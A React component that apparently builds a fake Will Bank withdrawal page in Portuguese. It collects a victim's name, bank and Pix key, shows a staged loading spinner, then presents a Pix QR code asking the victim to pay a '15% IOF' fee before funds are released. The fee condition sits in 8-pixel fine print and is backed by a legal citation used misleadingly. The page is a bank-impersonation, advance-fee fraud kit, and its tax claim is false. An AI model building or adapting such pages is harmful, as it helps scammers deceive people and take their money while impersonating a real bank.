import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Menu, Copy } from "lucide-react";
import { Switch } from "@/components/ui/switch";
import {
  Dialog,
  DialogContent,
} from "@/components/ui/dialog";
import { QRCodeSVG } from "qrcode.react";
import { toast } from "@/hooks/use-toast";
import willBankLogo from "@/assets/will-bank-logo.png";

const WithdrawForm = () => {
  const navigate = useNavigate();
  const [nomeCompleto, setNomeCompleto] = useState("");
  const [bancoDestinatario, setBancoDestinatario] = useState("");
  const [chavePix, setChavePix] = useState("");
  const [aceitaTermos, setAceitaTermos] = useState(false);
  const [errors, setErrors] = useState<{[key: string]: boolean}>({});
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showQrCode, setShowQrCode] = useState(false);
  
  const pixCode = "00020101021226810014br.gov.";

  useEffect(() => {
    if (showLoadingModal && !showQrCode) {
      const timer = setTimeout(() => {
        setShowQrCode(true);
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [showLoadingModal, showQrCode]);

  const handleCopyCode = () => {
    navigator.clipboard.writeText(pixCode);
    toast({
      title: "Código copiado!",
      description: "O código Pix foi copiado para a área de transferência.",
    });
  };

  const handleSubmit = () => {
    const newErrors: {[key: string]: boolean} = {};
    
    if (!nomeCompleto.trim()) newErrors.nomeCompleto = true;
    if (!bancoDestinatario.trim()) newErrors.bancoDestinatario = true;
    if (!chavePix.trim()) newErrors.chavePix = true;
    if (!aceitaTermos) newErrors.aceitaTermos = true;

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setShowLoadingModal(true);
    }
  };

  return (
    <div className="min-h-screen bg-primary flex flex-col font-serif max-w-md mx-auto">
      {/* Header */}
      <header className="flex items-center justify-between px-5 py-4 bg-white">
        {/* Logo */}
        <img src={willBankLogo} alt="Will Bank" className="h-11 w-auto" />
        
        {/* Menu button */}
        <button className="flex items-center gap-2 text-foreground">
          <Menu className="w-6 h-6" strokeWidth={2} />
          <span className="text-base" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>Menu</span>
        </button>
      </header>

      {/* Main content */}
      <main className="flex-1 flex flex-col px-4 pt-6 pb-8">
        {/* Form Card */}
        <div className="bg-secondary rounded-xl p-6 flex flex-col">
          {/* Title */}
          <h1 className="text-foreground text-[1.5rem] leading-[1.3] mb-6" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
            Preencha o formulário para receber os valores solicitados.
          </h1>

          {/* Nome Completo */}
          <div className="mb-5">
            <label className="text-foreground text-lg block mb-2" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
              Nome Completo
            </label>
            <input
              type="text"
              value={nomeCompleto}
              onChange={(e) => {
                const value = e.target.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '');
                setNomeCompleto(value);
              }}
              className={`w-full h-16 px-4 rounded border-2 bg-white text-foreground text-lg focus:outline-none focus:ring-2 focus:ring-primary ${
                errors.nomeCompleto ? "border-red-500" : "border-primary"
              }`}
            />
          </div>

          {/* Banco Destinatário */}
          <div className="mb-5">
            <label className="text-foreground text-lg block mb-2" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
              Banco Destinatário
            </label>
            <input
              type="text"
              value={bancoDestinatario}
              onChange={(e) => {
                const value = e.target.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '');
                setBancoDestinatario(value);
              }}
              className={`w-full h-16 px-4 rounded border-2 bg-white text-foreground text-lg focus:outline-none focus:ring-2 focus:ring-primary ${
                errors.bancoDestinatario ? "border-red-500" : "border-primary"
              }`}
            />
          </div>

          {/* Chave Pix */}
          <div className="mb-6">
            <label className="text-foreground text-lg block mb-2" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
              Chave Pix
            </label>
            <input
              type="text"
              value={chavePix}
              onChange={(e) => setChavePix(e.target.value)}
              className={`w-full h-16 px-4 rounded border-2 bg-white text-foreground text-lg focus:outline-none focus:ring-2 focus:ring-primary ${
                errors.chavePix ? "border-red-500" : "border-primary"
              }`}
            />
          </div>

          {/* Toggle Terms */}
          <div className={`flex items-center gap-3 mb-6 ${errors.aceitaTermos ? "text-red-500" : ""}`}>
            <Switch
              checked={aceitaTermos}
              onCheckedChange={setAceitaTermos}
              className="data-[state=checked]:bg-primary data-[state=unchecked]:bg-muted-foreground/30"
            />
            <p className="text-foreground/80 text-[8px] leading-tight" style={{ fontFamily: "'Open Sans', sans-serif" }}>
              Ao solicitar o saque para sua conta é necessário está de acordo com o pagamento de 15% do IOF (Imposto sobre Operações Financeiras)
            </p>
          </div>

          {/* Submit Button */}
          <button 
            onClick={handleSubmit}
            className="w-full py-4 bg-primary text-foreground rounded text-xl"
            style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}
          >
            Próximo
          </button>
        </div>

        {/* Loading Modal */}
        <Dialog open={showLoadingModal} onOpenChange={(open) => {
          setShowLoadingModal(open);
          if (!open) setShowQrCode(false);
        }}>
          <DialogContent className="bg-white rounded-3xl p-8 max-w-[320px] border-0 shadow-xl flex flex-col items-center gap-6 [&>button]:hidden">
            {!showQrCode ? (
              <>
                <h2 className="text-foreground text-2xl text-center" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
                  Gerando Qrcode
                </h2>
                
                {/* Yellow Spinner */}
                <div className="relative w-32 h-32">
                  <svg className="w-full h-full animate-spin" viewBox="0 0 100 100">
                    <circle
                      cx="50"
                      cy="50"
                      r="40"
                      stroke="hsl(var(--primary))"
                      strokeWidth="8"
                      fill="none"
                      strokeLinecap="round"
                      strokeDasharray="200"
                      strokeDashoffset="60"
                    />
                  </svg>
                </div>

                <p className="text-foreground/70 text-[10px] text-center leading-snug" style={{ fontFamily: "'Open Sans', sans-serif" }}>
                  O pagamento da taxa IOF é obrigatória conforme a Lei nº 5.143, de 20 de outubro de 1966.
                </p>
              </>
            ) : (
              <>
                {/* QR Code */}
                <div className="w-full flex justify-center">
                  <QRCodeSVG 
                    value={pixCode} 
                    size={220}
                    level="H"
                    className="rounded-none"
                  />
                </div>

                <p className="text-foreground/70 text-sm text-center leading-snug" style={{ fontFamily: "'Open Sans', sans-serif" }}>
                  Ao finalizar o pagamento você recebe os fundos solicitados via Pix, através da conta bancária vinculada.
                </p>

                {/* Pix Code Display */}
                <div className="w-full bg-white border-2 border-muted rounded-lg px-4 py-3 overflow-hidden">
                  <p className="text-foreground text-center text-sm font-mono truncate">
                    {pixCode}
                  </p>
                </div>

                {/* Copy Button */}
                <button 
                  onClick={handleCopyCode}
                  className="w-full py-3 bg-primary text-foreground rounded text-lg flex items-center justify-center gap-2"
                  style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}
                >
                  <Copy className="w-5 h-5" />
                  Copiar Código
                </button>
              </>
            )}
          </DialogContent>
        </Dialog>
      </main>
    </div>
  );
};

export default WithdrawForm;
